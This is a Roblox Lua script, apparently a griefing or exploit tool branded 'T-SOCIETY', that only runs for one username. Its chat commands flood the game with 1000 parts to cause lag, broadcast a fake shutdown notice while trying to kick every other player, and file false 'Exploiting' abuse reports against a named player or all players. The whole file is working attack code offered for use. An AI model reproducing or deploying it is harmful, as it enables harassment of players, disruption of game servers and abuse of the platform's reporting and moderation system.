local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if LocalPlayer.Name ~= "donhirsizi97" then return end

local function sayToAll(text)
	for _, plr in pairs(Players:GetPlayers()) do
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
	end
end

LocalPlayer.Chatted:Connect(function(msg)
	msg = msg:lower()
	
	if msg == ";lag" then
		sayToAll("⚠️ LAG: T-SOCIETY sistem yüklemesi başlatıldı...")
		for i = 1, 1000 do
			local part = Instance.new("Part", workspace)
			part.Anchored = true
			part.Size = Vector3.new(1,1,1)
			part.Position = Vector3.new(math.random(-200,200), math.random(20,80), math.random(-200,200))
			part.BrickColor = BrickColor.Random()
		end

	elseif msg == ";shutdown" then
		sayToAll("⚠️ Sunucu T-SOCIETY tarafından kapatılıyor...")
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= LocalPlayer then
				plr:Kick("💀 T-SOCIETY tarafından sistem kapatıldı.")
			end
		end

	elseif msg:sub(1, 7) == ";report" then
		local targetName = msg:sub(9)
		if targetName == "*" then
			for _, plr in pairs(Players:GetPlayers()) do
				if plr ~= LocalPlayer then
					pcall(function()
						Players:ReportAbuse(plr, "Exploiting")
					end)
				end
			end
		else
			for _, plr in pairs(Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #targetName) == targetName then
					pcall(function()
						Players:ReportAbuse(plr, "Exploiting")
					end)
				end
			end
		end
	end
end)
